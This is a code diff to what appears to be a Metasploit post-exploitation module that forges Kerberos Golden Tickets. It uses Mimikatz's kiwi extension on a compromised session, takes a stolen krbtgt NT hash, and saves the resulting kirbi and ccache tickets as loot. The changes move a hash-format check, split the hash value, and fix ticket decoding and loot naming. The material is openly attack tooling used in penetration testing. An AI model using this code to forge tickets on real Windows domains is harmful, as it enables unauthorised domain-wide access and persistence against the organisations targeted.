@@ -66,9 +66,6 @@ class MetasploitModule < Msf::Post
     id = datastore['ID'] || 0
     end_in = datastore['END_IN'] || 87608
 
-     # Golden Ticket requires an NTHash
-     if Metasploit::Framework::Hashes.identify_hash(krbtgt_hash)  != 'nt'
-      fail_with(Failure::BadConfig, 'KRBTGT_HASH must be an NTHash')
 
     unless domain
       print_status('Searching for the domain...')
@@ -117,6 +114,12 @@ class MetasploitModule < Msf::Post
       end
     end
 
+    # Golden Ticket requires an NTHash
+    if Metasploit::Framework::Hashes.identify_hash(krbtgt_hash) != 'nt'
+      fail_with(Failure::BadConfig, 'KRBTGT_HASH must be an NTHash')
+    end
+    krbtgt_hash = krbtgt_hash.split(':')[1]
+
     print_status("Creating Golden Ticket for #{domain}\\#{user}...")
     ticket = client.kiwi.golden_ticket_create({
       user: user,
@@ -131,17 +134,17 @@ class MetasploitModule < Msf::Post
     if ticket
       print_good('Golden Ticket Obtained!')
       kirbi_ticket = Base64.decode64(ticket)
-      kirbi_location = store_loot("golden.ticket",
+      kirbi_location = store_loot("golden_ticket",
                                    "kirbi",
                                    session,
-                                   ticket,
                                    kirbi_ticket,
                                    "#{domain}\\#{user}-golden_ticket.kirbi",
                                    "#{domain}\\#{user} Golden Ticket")
       print_status("Ticket saved to #{kirbi_location}")
+      krb_cred = Rex::Proto::Kerberos::Model::KrbCred.decode(kirbi_ticket)
 
-      ccache_ticket = Msf::Exploit::Remote::Kerberos::TicketConverter.kirbi_to_ccache(kirbi_ticket)
-      ccache_location = store_loot("golden.ticket",
+      ccache_ticket = Msf::Exploit::Remote::Kerberos::TicketConverter.kirbi_to_ccache(krb_cred)
+      ccache_location = store_loot("golden_ticket",
                                    "ccache",
                                    session,
                                    ccache_ticket,
